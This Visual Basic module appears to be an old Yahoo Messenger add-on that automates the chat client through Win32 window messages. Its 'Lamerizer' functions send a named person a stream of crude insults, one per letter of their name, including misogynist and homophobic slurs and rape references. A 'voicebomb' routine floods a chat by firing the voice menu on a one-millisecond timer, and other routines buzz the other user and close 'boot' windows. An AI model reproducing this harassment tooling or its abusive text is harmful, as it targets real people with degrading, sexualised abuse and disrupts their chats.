'Just Call It On Unload
'Call It Like This
' Call Unload2
Sub Unload2()
Dim yahoobudlist As Long
Dim SetCaption As Long
'finds the window
     yahoobudlist = FindWindow("YahooBuddyMain", vbNullString)
'Changes the Name of It
     SetCaption = SendMessageByString(yahoobudlist, WM_SETTEXT, 0, "I Guess Your Done Learning")
End Sub
'ends

'Use this On All the Forms Unload But Use Formdance on the main Form
'call it like this
'   FormLeave Me
'
Public Sub FormLeave(frmform As Form)
 Do: DoEvents
 frmform.Left = frmform.Left + 600&
 Loop Until frmform.Left > Screen.Width
 End Sub
'ends


'This Is The Lamerizer For A Girl
'Call it like This
'Call Lamerboy(TEXT1.Text, TEXT1.Text)
Public Function Lamergirl(split As String, lamer As String)
YahooSend ("<b><RED>YaHoE'z Lamer - iZer Is Loaded")
Pause (0.35)
YahooSend ("<B><RED>Todayz Lamer Is a Girl Her Name Is-><BLUE> " & lamer$)
Pause (2)
Dim X As Integer
Dim lcse As String
Dim letr As String
Dim dis As String

For X = 1 To Len(split)
lcse$ = LCase(split)
letr$ = Mid(lcse$, X, 1)
If letr$ = "a" Then Let dis$ = "<b>a-is for The Air Head You Are": GoTo Dissem
If letr$ = "b" Then Let dis$ = "<b>b-is for Bitch You Try To Be": GoTo Dissem
If letr$ = "c" Then Let dis$ = "<b>c-is for the cunt you are": GoTo Dissem
If letr$ = "d" Then Let dis$ = "<b>d-is for the Dick EveryBody Says You Have": GoTo Dissem
If letr$ = "e" Then Let dis$ = "<b>e-is for Them Big Azz Ears You Have": GoTo Dissem
If letr$ = "f" Then Let dis$ = "<b>f-is for The Fag That You Date": GoTo Dissem
If letr$ = "g" Then Let dis$ = "<b>g-is for Girl YOur Not": GoTo Dissem
If letr$ = "h" Then Let dis$ = "<b>h-is for The Hoe You Are": GoTo Dissem
If letr$ = "i" Then Let dis$ = "<b>i-is for Insane Person That Said you Was Hot": GoTo Dissem
If letr$ = "j" Then Let dis$ = "<b>j-is for THe Jack Azz That Went Out With You": GoTo Dissem
If letr$ = "k" Then Let dis$ = "<b>k-is for The KY jelly That You Use To Fuck Your Man In The Azz": GoTo Dissem
If letr$ = "l" Then Let dis$ = "<b>l-is for The Lamerz that All Your Friends Are": GoTo Dissem
If letr$ = "m" Then Let dis$ = "<b>m-is for The Makeover You Need": GoTo Dissem
If letr$ = "n" Then Let dis$ = "<b>n-is for All THe Night'z You JackOff ": GoTo Dissem
If letr$ = "o" Then Let dis$ = "<b>o-is for Your Old ass Ugly Self": GoTo Dissem
If letr$ = "p" Then Let dis$ = "<b>p-is for P.U. The Way You Stank": GoTo Dissem
If letr$ = "q" Then Let dis$ = "<b>q-is for The Quicky You Gave Me Last Night": GoTo Dissem
If letr$ = "r" Then Let dis$ = "<b>r-is for The Ragz YOu Call Clothes": GoTo Dissem
If letr$ = "s" Then Let dis$ = "<b>s-is for The Slut You Are": GoTo Dissem
If letr$ = "t" Then Let dis$ = "<b>t-is for THe Time You Got Fucked UP": GoTo Dissem
If letr$ = "u" Then Let dis$ = "<b>u-is for Your Ugly Azz": GoTo Dissem
If letr$ = "v" Then Let dis$ = "<b>v-is for Vine You Should Use To Hide Your Self": GoTo Dissem
If letr$ = "w" Then Let dis$ = "<b>w-is for How Weard You Are":  GoTo Dissem
If letr$ = "x" Then Let dis$ = "<b>x-is for All X Amount Of The People That Talk To YOu": GoTo Dissem
If letr$ = "y" Then Let dis$ = "<b>y-is for Nobody Like'n You": GoTo Dissem
If letr$ = "z" Then Let dis$ = "<b>z-is for zero which is what you are":  GoTo Dissem

If letr$ = "1" Then Let dis$ = "<b>1-is for How Many dollars You Charge": GoTo Dissem
If letr$ = "2" Then Let dis$ = "<b>2-is for How Many People Really  PAy For You": GoTo Dissem
If letr$ = "3" Then Let dis$ = "<b>3-is for How Many Guys You Are With In 1 Hour": GoTo Dissem
If letr$ = "4" Then Let dis$ = "<b>4-is for How Many Times I Am Gonna Boot You":  GoTo Dissem
If letr$ = "5" Then Let dis$ = "<b>5-is for How Many Dickz You Have Had In The Last 10 Min.": GoTo Dissem
If letr$ = "6" Then Let dis$ = "<b>6-is for All The Guys That Raped You": GoTo Dissem
If letr$ = "7" Then Let dis$ = "<b>7-is for How Much Money You Dont Have": GoTo Dissem
If letr$ = "8" Then Let dis$ = "<b>8-is for all The Girls You Have 8": GoTo Dissem
If letr$ = "9" Then Let dis$ = "<b>9-is for All The Free Head Jobs You Gave Me": GoTo Dissem
If letr$ = "0" Then Let dis$ = "<b>0-is for What You Are": GoTo Dissem
If letr$ = "_" Then Let dis$ = "<b>_-is for how stupid you are to have a _ in your name": GoTo Dissem

Dissem:
YahooSend dis$

Pause 0.9
Next X

End Function
'ends

'This Is The Lamerizer For A Boy
'Call it like This
'Call Lamerboy(TEXT1.Text, TEXT1.Text)
Public Function Lamerboy(split As String, lamer As String)
YahooSend ("<b><Red>YaHoE'z Lamer - iZer Is Loaded")
Pause (0.35)
YahooSend ("<B><RED>Todayz Lamer Is a Dude His Name Is -><BLUE> " & lamer$)
Pause (2)
Dim X As Integer
Dim lcse As String
Dim letr As String
Dim dis As String

For X = 1 To Len(split)
lcse$ = LCase(split)
letr$ = Mid(lcse$, X, 1)
If letr$ = "a" Then Let dis$ = "<b>a-is for the animals your momma fucks": GoTo Dissem
If letr$ = "b" Then Let dis$ = "<b>b-is for all the boys you love": GoTo Dissem
If letr$ = "c" Then Let dis$ = "<b>c-is for the cunt you are": GoTo Dissem
If letr$ = "d" Then Let dis$ = "<b>d-is for the small dick you have": GoTo Dissem
If letr$ = "e" Then Let dis$ = "<b>e-is for that egghead of yours": GoTo Dissem
If letr$ = "f" Then Let dis$ = "<b>f-is for the friday nights you stay home": GoTo Dissem
If letr$ = "g" Then Let dis$ = "<b>g-is for the girls who hate you": GoTo Dissem
If letr$ = "h" Then Let dis$ = "<b>h-is for the ho your momma is": GoTo Dissem
If letr$ = "i" Then Let dis$ = "<b>i-is for the idiotic dumbass you are": GoTo Dissem
If letr$ = "j" Then Let dis$ = "<b>j-is for all the times you jerkoff to your dog": GoTo Dissem
If letr$ = "k" Then Let dis$ = "<b>k-is for you self esteem that the cool kids killed": GoTo Dissem
If letr$ = "l" Then Let dis$ = "<b>l-is for the lame ass you are": GoTo Dissem
If letr$ = "m" Then Let dis$ = "<b>m-is for the many men you sucked": GoTo Dissem
If letr$ = "n" Then Let dis$ = "<b>n-is for the nights you spent alone": GoTo Dissem
If letr$ = "o" Then Let dis$ = "<b>o-is for the sex operation you had": GoTo Dissem
If letr$ = "p" Then Let dis$ = "<b>p-is for the times people pee on you": GoTo Dissem
If letr$ = "q" Then Let dis$ = "<b>q-is for the queer you are": GoTo Dissem
If letr$ = "r" Then Let dis$ = "<b>r-is for all the times i raped your sister": GoTo Dissem
If letr$ = "s" Then Let dis$ = "<b>s-is for your lover Steve Case": GoTo Dissem
If letr$ = "t" Then Let dis$ = "<b>t-is for the tits youll never see": GoTo Dissem
If letr$ = "u" Then Let dis$ = "<b>u-is for your underwear hangin on the flagpole": GoTo Dissem
If letr$ = "v" Then Let dis$ = "<b>v-is for the victories you'll never have": GoTo Dissem
If letr$ = "w" Then Let dis$ = "<b>w-is for the 400 pounds you wiegh":  GoTo Dissem
If letr$ = "x" Then Let dis$ = "<b>x-is for all the lamers who" & Chr(34) & "[x]'ed" & Chr(34) & " you online": GoTo Dissem
If letr$ = "y" Then Let dis$ = "<b>y-is for the question of, y your even alive?": GoTo Dissem
If letr$ = "z" Then Let dis$ = "<b>z-is for zero which is what you are":  GoTo Dissem

If letr$ = "1" Then Let dis$ = "<b>1-is for how many inches your dick is": GoTo Dissem
If letr$ = "2" Then Let dis$ = "<b>2-is for the 2 dollars you make an hour": GoTo Dissem
If letr$ = "3" Then Let dis$ = "<b>3-is for the amount of men your girl takes at once": GoTo Dissem
If letr$ = "4" Then Let dis$ = "<b>4-is for your mom bein a whore":  GoTo Dissem
If letr$ = "5" Then Let dis$ = "<b>5-is for 5 times an hour you whack off": GoTo Dissem
If letr$ = "6" Then Let dis$ = "<b>6-is for the years you been single": GoTo Dissem
If letr$ = "7" Then Let dis$ = "<b>7-is for the times your girl cheated on you..with me": GoTo Dissem
If letr$ = "8" Then Let dis$ = "<b>8-is for how many people beat the hell outta you today": GoTo Dissem
If letr$ = "9" Then Let dis$ = "<b>9-is for how many boyfriends your momma has": GoTo Dissem
If letr$ = "0" Then Let dis$ = "<b>0-is for the amount of girls you get": GoTo Dissem
If letr$ = "_" Then Let dis$ = "<b>_-is for how stupid you are to have a _ in your name": GoTo Dissem

Dissem:
YahooSend dis$

Pause 0.9
Next X

End Function
'ends

'this Gets The Text Out Of a Pm Box
'atleeb Needs To Be updated Though
Function GetChatText()
Dim TheText As String, TL As Long
Dim imclass As Long
Dim atleeb As Long
Dim internetexplorerserver As Long

imclass = FindWindow("imclass", vbNullString)
atleeb = FindWindowEx(imclass, 0&, "atl:004eeb68", vbNullString)
internetexplorerserver = FindWindowEx(atleeb, 0&, "internet explorer_server", vbNullString)
TL = SendMessageLong(internetexplorerserver&, WM_GETTEXTLENGTH, 0&, 0&)
TheText = String(TL + 1, " ")
Call SendMessageByString(internetexplorerserver&, WM_GETTEXT, TL + 1, (TheText))
TheText = Left(TheText, TL)
End Function
'ends

'This gets the name of the chat if its a pm then it returns person's pm
'Call It Like This
' text1.text = GetChatName
Function GetChatName()
Dim imclass As Long
imclass = FindWindow("imclass", vbNullString)
Dim TheText As String, TL As Long
TL = SendMessageLong(imclass, WM_GETTEXTLENGTH, 0&, 0&)
TheText = String(TL + 1, " ")
Call SendMessageByString(imclass, WM_GETTEXT, TL + 1, TheText)
TheText = Left(TheText, TL)
If TheText = "" Then GoTo ChatNotOpen
If InStr(TheText, "Instant") Then
        thetextlen& = (Len(TheText) - 19)
        TheText$ = Left$(TheText, thetextlen&)
        Y_ChatGetName = TheText + "'s pm"
        GoTo ChatNotOpen
End If
        thetextlen& = (Len(TheText) - 10)
        TheText$ = Left$(TheText, thetextlen&)
ChatGetName = TheText
ChatNotOpen:
End Function

Function GetPMWind()
'returns the im window
GetPMWind = FindWindow("imclass", vbNullString)
End Function

'Same As RunMenuByString
Sub ClickMenu(lngHwnd As Long, strText As String)
'this will click a menu from a window
Dim lngMenuHnd                  As Long
Dim lngMenuCount                As Long
Dim lngCurrentMenuIndex         As Long
Dim lngMenuHndSub               As Long
Dim lngMenuItemCount            As Long
Dim lngCurrentSubMenuIndex      As Long
Dim lngSubCount                 As Long
Dim strMenuString               As String
Dim lngCurrentSubMenuIndexMenu  As Long
Dim lngMenuItem                 As Long
lngMenuHnd& = GetMenu(lngHwnd)
lngMenuCount = GetMenuItemCount(lngMenuHnd&)
For lngCurrentMenuIndex = 0 To lngMenuCount - 1
lngMenuHndSub& = GetSubMenu(lngMenuHnd&, lngCurrentMenuIndex)
lngMenuItemCount = GetMenuItemCount(lngMenuHndSub&)
For lngCurrentSubMenuIndex = 0 To lngMenuItemCount - 1
lngSubCount = GetMenuItemID(lngMenuHndSub&, lngCurrentSubMenuIndex)
strMenuString$ = String$(100, " ")
lngCurrentSubMenuIndexMenu = GetMenuString(lngMenuHndSub&, lngSubCount, strMenuString$, 100, 1)
If InStr(UCase(strMenuString$), UCase(strText$)) Then
lngMenuItem = lngSubCount
Call SendMessage(lngHwnd, WM_COMMAND, lngMenuItem, 0)
Exit Sub
End If
Next lngCurrentSubMenuIndex
Next lngCurrentMenuIndex
End Sub

'This Opens A New PM Window
'Call It Like This
' Call OpenPM2
Sub OpenPM2()
Dim yahoobuddymain As Long
yahoobuddymain = FindWindow("yahoobuddymain", vbNullString)
Call ClickMenu(yahoobuddymain, "Send a &Message")
End Sub
'ends

'Sets The Text Of The Chat Box
'Call It Like This
' Call ChatsetText ("WHAT YOU WANNA SAY")
Sub ChatSetText(WhatToSet As String)
Dim imclass As Long, RICHEDIT As Long
imclass = FindWindow("imclass", vbNullString)
RICHEDIT = FindWindowEx(imclass, 0&, "richedit", vbNullString)
Call SendMessageByString(RICHEDIT, WM_SETTEXT, 0&, (WhatToSet))
End Sub
'ends

'This Hits The Send Button
'Call It Like This
' Call HitSend
Sub HitSend()
Dim imclass As Long
Dim Button As Long
imclass = FindWindow("imclass", vbNullString)
Button = FindWindowEx(imclass, 0&, "button", vbNullString)
Button = FindWindowEx(imclass, Button, "button", vbNullString)
Call SendMessageLong(Button, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(Button, WM_LBUTTONUP, 0&, 0&)
End Sub
'ends

'Makes Your Form Fly Down Off The Screen
'Call It Like This
' Call Form_ExitDown (me)
Sub Form_ExitDown(Form As Form)
'Gives your form that cool flying down effect
Do Until Form.Top >= 13000
Form.Top = Trim(Str(Int(Form.Top) + 175))
Loop
'Unload Form
End Sub
'ends

'THis Close's The PM WINDOW That Is Topmost
'Call It Like This
'Call ClosePM
Sub ClosePm()
Dim imclass As Long
imclass = FindWindow("imclass", vbNullString)
Call SendMessageLong(imclass, WM_CLOSE, 0&, 0&)
End Sub
'ends

'This Sets The Id In The Top Of THe Pm Box When YOu 1st Open IT
'Call It Like This
' Call setid(TEXT1.TEXT)
Sub SetId(WhatToSet As String)
Dim imclass As Long
Dim editx As Long
imclass = FindWindow("imclass", vbNullString)
editx = FindWindowEx(imclass, 0&, "edit", vbNullString)
Call SendMessageByString(editx, WM_SETTEXT, 0&, (WhatToSet))
End Sub
'ends

'This Makes The Text Backwords And Then Sendds IT
'Call It Like This
'Yahoosend Talker_BackWords(Text1.Text)
Public Function Talker_BackWords(Text As String)
Dim Center As Integer, ReplaceMent As String
For Center = Len(Text) To 1 Step -1
ReplaceMent = ReplaceMent & Mid(Text, Center, 1)
Next
Talker_BackWords = (ReplaceMent)
End Function
'ends

'Sets THe Box On Yahoo That Says Status
'Call It Like This
'  Call Setstuff ("WHAT TO SAY")
Sub SetStuff(WhatToSet As String)
Dim yahoobuddymain As Long
Dim msctlsstatusbar As Long

yahoobuddymain = FindWindow("yahoobuddymain", vbNullString)
msctlsstatusbar = FindWindowEx(yahoobuddymain, 0&, "msctls_statusbar32", vbNullString)
Call SendMessageByString(msctlsstatusbar, WM_SETTEXT, 0&, (WhatToSet))
End Sub

'This Opens A Pm Window
'Use It like This
' Call OpenPm
Sub OpenPM()
Dim yahoobuddymain As Long, yviewmanager As Long, friendtreeparent As Long
Dim tabtoolbar As Long
yahoobuddymain = FindWindow("yahoobuddymain", vbNullString)
yviewmanager = FindWindowEx(yahoobuddymain, 0&, "yviewmanager", vbNullString)
friendtreeparent = FindWindowEx(yviewmanager, 0&, "friendtreeparent", vbNullString)
tabtoolbar = FindWindowEx(friendtreeparent, 0&, "tabtoolbar", vbNullString)
Call SendMessageLong(tabtoolbar, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(tabtoolbar, WM_LBUTTONUP, 0&, 0&)
End Sub
'ends

'THis Calls The ChatSettext and hitsend
'Call It Like This
'  Call CHatsend("WHAT YOU WANNA SAY")
Sub ChatSend(whattosend As String)
ChatSetText whattosend$
HitSend
End Sub
'ends

'This Sub Starts Or Stops the Voice In A Chat Or PM
' This Is How You Us It
' Make a Form With A Timer & 2 Buttons
'THen
'The Timer Should Look Like This
'        Private Sub Timer1_Timer()
'        Call VoiceBOMB
'        End Sub
'
'The Start Button Should Look Like This
'        Private Sub Command1_Click()
'        Timer1.Enabled = True
'        Timer1.interval = 1
'        End Sub
'
'The Stop Button Should Look Like this
'        Private Sub Command2_Click()
'        Timer1.Enabled = False
'        End Sub
'Call This Lagg Like This
Sub voicebomb()
Call RunMenubystring(Y_PMWind, "Enable &Voice")
End Sub
'ends

'This Buzz Who Ever YOu Are Chatin With
'Call It Like This
' Call Buzzer
Sub Buzzer()
Call RunMenubystring(Y_PMWind, "&Buzz Friend")
End Sub
'ends

'This Finds THe PM Window
Function Y_PMWind()
Y_PMWind = FindWindow("imclass", vbNullString)
End Function

'This Gets All The Items In The Menu
'Its Needed For  Other Things in This Module
Sub RunMenubystring(Window, mnuCap)
Dim ToSearch As Long
Dim MenuCount As Integer
Dim FindString
Dim ToSearchSub As Long
Dim MenuItemCount As Integer
Dim GetString
Dim SubCount As Long
Dim MenuString As String                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             'CBM RULES BITCH
Dim GetStringMenu As Integer
Dim MenuItem As Long
Dim RunTheMenu As Integer


ToSearch& = GetMenu(Window)
MenuCount% = GetMenuItemCount(ToSearch&)

For FindString = 0 To MenuCount% - 1
ToSearchSub& = GetSubMenu(ToSearch&, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub&)
For GetString = 0 To MenuItemCount% - 1
SubCount& = GetMenuItemID(ToSearchSub&, GetString)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub&, SubCount&, MenuString$, 100, 1)
If InStr(UCase(MenuString$), UCase(mnuCap)) Then
MenuItem& = SubCount&
GoTo MatchString
End If
Next GetString
Next FindString
MatchString:
RunTheMenu% = SendMessage(Window, WM_COMMAND, MenuItem&, 0)
End Sub
Public Sub ANTI()
'Anti boot for new build
Dim imclass As Long
Dim atleeb As Long
imclass = FindWindow("imclass", vbNullString)
atleeb = FindWindowEx(imclass, 0&, "ATL:004F0BA8", vbNullString)
Call SendMessageLong(atleeb, WM_CLOSE, 0&, 0&)
End Sub


'HOPE YOu HAVE FUN WITH THIS MODULE
